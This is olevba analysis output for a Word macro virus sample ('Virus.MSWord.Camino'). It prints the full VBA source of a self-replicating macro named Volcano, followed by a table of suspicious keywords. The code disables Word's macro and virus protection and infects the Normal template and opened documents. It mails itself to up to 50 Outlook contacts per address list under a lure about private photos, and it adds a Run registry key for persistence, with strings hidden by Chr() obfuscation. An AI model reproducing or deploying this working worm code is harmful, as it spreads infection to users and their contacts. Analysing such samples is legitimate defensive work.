olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Camino-8608f3c88c079333a49d86f483b1caefbf12aa46
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Camino-8608f3c88c079333a49d86f483b1caefbf12aa46 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Volcano.bas 
in file: Virus.MSWord.Camino-8608f3c88c079333a49d86f483b1caefbf12aa46 - OLE stream: 'Macros/VBA/Volcano'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileOpen()
  On Error Resume Next
  Dialogs(wdDialogFileOpen).Show
  Infectar
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub AutoClose()
  On Error Resume Next
  Infectar
End Sub

Private Sub Infectar()

On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    With Options
        .ConfirmConversions = (10 - 10)
        .VirusProtection = (10 - 10)
        .SaveNormalPrompt = (10 - 10)
        .CheckGrammarAsYouType = (10 - 10)
        .CheckGrammarWithSpelling = (10 - 10)
        .SavePropertiesPrompt = (10 - 10)
    End With
    
End If

With Application
    .ScreenUpdating = False
    .DisplayAlerts = False
    .EnableCancelKey = wdCancelDisabled
End With

Enviar

Set NT = NormalTemplate.VBProject.VBComponents
Set AD = ActiveDocument.VBProject.VBComponents
N = False: A = False: G = False

If NT.Count > 0 Then
   For c = 1 To NT.Count
      If NT.Item(c).Name = "Volcano" Then
         N = True: G = True
      End If
   Next c
End If
If N <> True Then
   AD("Volcano").Export "c:\Volcano.dll"
   Set Alvo = NormalTemplate.VBProject
End If

If AD.Count > 0 Then
   For c = 1 To AD.Count
      If AD.Item(c).Name = "Volcano" Then
         A = True: G = True
      End If
   Next c
End If

If A <> True Then
   NT("Volcano").Export "c:\Volcano.dll"
   Set Alvo = ActiveDocument.VBProject
End If

If G = True Then
   Alvo.VBComponents.Import ("c:\Volcano.dll")
   Kill ("c:\Volcano.dll")
End If

If Day(Now) = Minute(Now) Then
   Selection.Font.Name = "Arial"
   Selection.Font.Size = 9
   If Selection.LanguageID = wdBrazilianPortuguese Then
      Selection.TypeText "Você recebeu o Volcano! Tire proveito do privilégio."
   Else
      Selection.TypeText "You received the Volcano! Take advantage of the privilege."
   End If
End If

End Sub

Private Sub Enviar()

On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Volcano?") <> "...Rol12" Then
   Out = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110)
   Map = Chr(77) + Chr(65) + Chr(80) + Chr(73)
   Dim UO As Object
   Dim MN, BS
   Set UO = CreateObject(Out)
   Set MN = UO.GetNameSpace(Map)

   If Selection.LanguageID = wdBrazilianPortuguese Then
      t = "Mensagem Importante de "
      T2 = "Este e' o documento que voce pediu...Nao mostre pra ninguem.Ative a macro para ver as fotos"
   Else
      t = "Important Message From "
      T2 = "Here is that document you asked for...Don 't show anyone else.Activate the macro to see the photos"
   End If
   
   If UO = "Outlook" Then
      MN.Logon "profile", "password"
      For y = 1 To MN.AddressLists.Count
          Set AddyBook = MN.AddressLists(y)
          x = 1
          Set BS = UO.CreateItem(0)
          For oo = 1 To AddyBook.AddressEntries.Count
              Peep = AddyBook.AddressEntries(x)
              BS.Recipients.Add Peep
              x = x + 1
              If x > 50 Then oo = AddyBook.AddressEntries.Count
          Next oo
          BS.Subject = t & Application.UserName
          BS.Body = T2
          BS.Attachments.Add ActiveDocument.FullName
          BS.Send
          Peep = ""
      Next y
      MN.Logoff
   End If
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Volcano?") = "...Rol12"
   
   If Dir(Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(78) + Chr(84) + Chr(92) + Chr(83) + Chr(89) + Chr(83) + Chr(84) + Chr(69) + Chr(77) + Chr(92) + Chr(42) + Chr(46) + Chr(42)) <> "" Then
      Caminho = Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(78) + Chr(84) + Chr(92) + Chr(83) + Chr(89) + Chr(83) + Chr(84) + Chr(69) + Chr(77) + Chr(92)
   Else
      Caminho = Chr(67) & Chr(58) & Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(68) + Chr(79) + Chr(87) + Chr(83) + Chr(92) + Chr(83) + Chr(89) + Chr(83) + Chr(84) + Chr(69) + Chr(77) + Chr(92)
   End If
   
   If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", Chr(86) + Chr(99) + Chr(49) + Chr(50)) <> Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(86) + Chr(98) + Chr(115) Then
      System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", Chr(86) + Chr(99) + Chr(49) + Chr(50)) = Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(86) + Chr(98) + Chr(115)
      
      ActiveDocument.VBProject.VBComponents("Volcano").Export Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108)
      NormalTemplate.VBProject.VBComponents("Volcano").Export Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

      Open Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(86) + Chr(98) + Chr(115) For Output As #1
      Print #1, "Set W = WScript.CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")"
      Print #1, "W.NormalTemplate.VBProject.VBComponents.Import (" + Chr(34) + Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108) + Chr(34) + ")"
      Print #1, "W.Application.Quit"
      Close #1
   
   End If
End If
End Sub
Sub r()
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Volcano?") = "rr"
End Sub

Sub ToolsMacro()
End Sub

Sub FileTemplates()
End Sub

Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Volcano.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

